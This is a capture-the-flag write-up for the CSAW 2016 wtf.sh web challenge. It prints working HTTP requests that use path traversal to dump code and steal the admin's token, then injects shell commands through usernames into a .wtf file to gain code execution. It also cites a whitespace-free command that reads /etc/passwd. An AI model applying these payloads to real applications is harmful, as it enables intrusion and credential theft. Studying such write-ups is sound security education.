# CSAW CTF 2016 wtf.sh Writeup

wtf.sh was a challenge that included two flags, one for 150pts and one for 400pts.

## wtf.sh (1) (150pts)

In the first part we needed to call the function `get_flag1` in order to receive the flag. The `post` parameter of `post.wtf` was vulnerable to a path traversal:

```
GET /profile.wtf?user=../posts HTTP/1.1
Host: web.chal.csaw.io:8001
Cookie: USERNAME=test; TOKEN=HqZLY8GTURdESfMQn2+vDPRL4hpafUVU+ZeEhMGllZmEoD+AVa4Ucc9bIg9ht0r0gTzoDA927dK9OgLVxfHoYw==
```

Sending this request returned the content of all files in the sandbox directory (the code is available [here](https://kleber.io/odPM2AoqaZXmIFKZSqfbvFw46jRujfi0OvYQ2qVXpGZ1W)). There was also another path traversal in the `user` parameter of `profile.wtf` which allowed directory listings:

```
GET /profile.wtf?user=../../* HTTP/1.1
Host: web.chal.csaw.io:8001
Cookie: USERNAME=test; TOKEN=HqZLY8GTURdESfMQn2+vDPRL4hpafUVU+ZeEhMGllZmEoD+AVa4Ucc9bIg9ht0r0gTzoDA927dK9OgLVxfHoYw==
```

With these two vulnerabilities we were able to read all the site's code and explore the directory structure. The user data resides in the `users` directory, where a user file included a user's name, password hash and login token. Using the first directory traversal we were able to get the login token for the admin user:

```
GET /post.wtf?post=../users/ HTTP/1.1
Host: web.chal.csaw.io:8001
Cookie: USERNAME=test; TOKEN=HqZLY8GTURdESfMQn2+vDPRL4hpafUVU+ZeEhMGllZmEoD+AVa4Ucc9bIg9ht0r0gTzoDA927dK9OgLVxfHoYw==


HTTP/1.1 200 OK
[...]
<span class="post-poster">Posted by <a href="/profile.wtf?user=QNI5P">admin</a></span>
<span class="post-title">3f0b1ebe20e3682b1a5d701590ad76fb051d3a08</span>
<span class="post-body">ecX+3sJzU16hZeUPdfVy+h8kDJXsvR4DOd1QrliIBLRmgYs7sFqJvL/zRmUyhul5GtlLRbTHI/SWHMyNTcWPSw==</span>
[...]
```

In the code we saw that the `get_flag1` command will be called whenever the admin user accesses his profile on `profile.wtf`:

```bash
$ if contains 'user' ${!URL_PARAMS[@]} && file_exists "users/${URL_PARAMS['user']}"
$ then
$   local username=$(head -n 1 users/${URL_PARAMS['user']});
$   echo "<h3>${username}'s posts:</h3>";
$   echo "<ol>";
$   get_users_posts "${username}" | while read -r post; do
$       post_slug=$(awk -F/ '{print $2 "#" $3}' <<< "${post}");
$       echo "<li><a href=\"/post.wtf?post=${post_slug}\">$(nth_line 2 "${post}" | htmlentities)</li>";
$   done
$   echo "</ol>";
$   if is_logged_in && [[ "${COOKIES['USERNAME']}" = 'admin' ]] && [[ ${username} = 'admin' ]]
$   then
$       get_flag1
$   fi
$ fi
```

We also see in the code (`user_functions.sh`) that whenever a user registers a directory in users_lookup will be created with the SHA1 of the username as directoroy name. In order to get the proper user ID for the admin user to access the admin profile we can just read the userid file:

```
GET /profile.wtf?user=../users_lookup/4015bc9ee91e437d90df83fb64fbbe312d9c9f05/userid HTTP/1.1
Host: web.chal.csaw.io:8001
Cookie: USERNAME=test; TOKEN=HqZLY8GTURdESfMQn2+vDPRL4hpafUVU+ZeEhMGllZmEoD+AVa4Ucc9bIg9ht0r0gTzoDA927dK9OgLVxfHoYw==


HTTP/1.1 200 OK
[...]
<h3>QNI5P's posts:</h3>
[...]
```

Now we can get the flag:

```
GET /profile.wtf?user=QNI5P HTTP/1.1
Host: web.chal.csaw.io:8001
Cookie: USERNAME=admin; TOKEN=ecX+3sJzU16hZeUPdfVy+h8kDJXsvR4DOd1QrliIBLRmgYs7sFqJvL/zRmUyhul5GtlLRbTHI/SWHMyNTcWPSw==


HTTP/1.1 200 OK
[...]
Flag: flag{l00k_at_m3_I_am_th3_4dm1n_n0w}
[...]
```

## wtf.sh (2) (400pts)

The second part of the challenge was a little bit more complicated. We had to call `get_flag2`, but the code we dumped did not include any reference. So we had to dig deeper into the code to get remote code exection.

We saw in the code that `wtf.sh` includes a function that parses and executes .wtf files:

```bash
max_page_include_depth=64
page_include_depth=0
function include_page {
    # include_page <pathname>
    local pathname=$1
    local cmd=""
    [[ "${pathname:(-4)}" = '.wtf' ]];
    local can_execute=$?;
    page_include_depth=$(($page_include_depth+1))
    if [[ $page_include_depth -lt $max_page_include_depth ]]
    then
        local line;
        while read -r line; do
            # check if we're in a script line or not ($ at the beginning implies script line)
            # also, our extension needs to be .wtf
            [[ "$" = "${line:0:1}" && ${can_execute} = 0 ]];
            is_script=$?;

            # execute the line.
            if [[ $is_script = 0 ]]
            then
                cmd+=$'\n'"${line#"$"}";
            else
                if [[ -n $cmd ]]
                then
                    eval "$cmd" || log "Error during execution of ${cmd}";
                    cmd=""
                fi
                echo $line
            fi
        done < ${pathname}
    else
        echo "<p>Max include depth exceeded!<p>"
    fi
}
```

So what we had to do is upload a file containing shell code starting with a "$" and the filename needed to have the .wtf extension. An interesting function we found in the `post_functions.sh` file was `reply`:

```bash
function reply {
    local post_id=$1;
    local username=$2;
    local text=$3;
    local hashed=$(hash_username "${username}");

    curr_id=$(for d in posts/${post_id}/*; do basename $d; done | sort -n | tail -n 1);
    next_reply_id=$(awk '{print $1+1}' <<< "${curr_id}");
    next_file=(posts/${post_id}/${next_reply_id});
    echo "${username}" > "${next_file}";
    echo "RE: $(nth_line 2 < "posts/${post_id}/1")" >> "${next_file}";
    echo "${text}" >> "${next_file}";

    # add post this is in reply to to posts cache
    echo "${post_id}/${next_reply_id}" >> "users_lookup/${hashed}/posts";
}
```

When replying to a post we submitted the post ID via the `post` GET parameter. This parameter was also vulnerable to path traversals, which allowed us to define a filename to write to. The function also wrote the username on the first line of the file. So if we just registered a username that contains a valid shell command and write it to a file ending with .wtf into a directory where we could access the file would give us code execution. Fourtunately, the users_lookup file did not include a `.noread` file so we could just write a .wtf file to users_lookup.

The applicaiton allowed to register users containing special chars like "$", but was buggy with usernames containing whitespaces. However, because bash allows to execute commands without whitespaces (e.g. {cat,/etc/passwd}), this was not a problem. So we've registered the user `${find,/,-iname,get_flag2}` and created a reply with the following request:

```
POST /reply.wtf?post=../users_lookup/sh.wtf%09 HTTP/1.1
Host: web.chal.csaw.io:8001
Content-Type: application/x-www-form-urlencoded
Cookie: USERNAME=${find,/,-iname,get_flag2}; TOKEN=Uf7xrOWHXoRzLdVS6drbhjHyIZVsCXFgQYnOG01UhENS1aaajeezaWrgpOno8HBljrHOMmfbQUY+rES1bWlNWQ==

text=asd&submit=
```

Note that the filename is prepended with `%09` which is a horizontal tab. This is required because the reply function would interpret the name as directory name and the command would fail.

When we now call the file we get the following response:

```
GET /users_lookup/sh.wtf HTTP/1.1
Host: web.chal.csaw.io:8001
Cookie: USERNAME=${find,/,-iname,get_flag2}; TOKEN=Uf7xrOWHXoRzLdVS6drbhjHyIZVsCXFgQYnOG01UhENS1aaajeezaWrgpOno8HBljrHOMmfbQUY+rES1bWlNWQ==


HTTP/1.1 200 OK
[...]
/usr/bin/get_flag2
RE:
asd
```

So the `get_flag2` is a binary that resides in `/usr/bin/`. We now just need to create the user `$/usr/bin/get_flag2` and send the reply request again:

```
POST /reply.wtf?post=../users_lookup/sh.wtf%09 HTTP/1.1
Host: web.chal.csaw.io:8001
Content-Length: 16
Content-Type: application/x-www-form-urlencoded
Cookie: USERNAME=$/usr/bin/get_flag2; TOKEN=neappNHO7cRKNouqa1+xBYq8AWNTE2PqLcxh0JPFkaaNF5UOXc/C2fOL+JkQP65OZxc9BUkRnt1h8Z98bFbHZA==

text=asd&submit=

--

GET /users_lookup/sh.wtf HTTP/1.1
Host: web.chal.csaw.io:8001


HTTP/1.1 200 OK
[...]
Flag: flag{n0b0dy_exp3c75_th3_p4r3nth3s1s_1nqu1s1t10n}
ÿÿÿ
RE:
asd
```
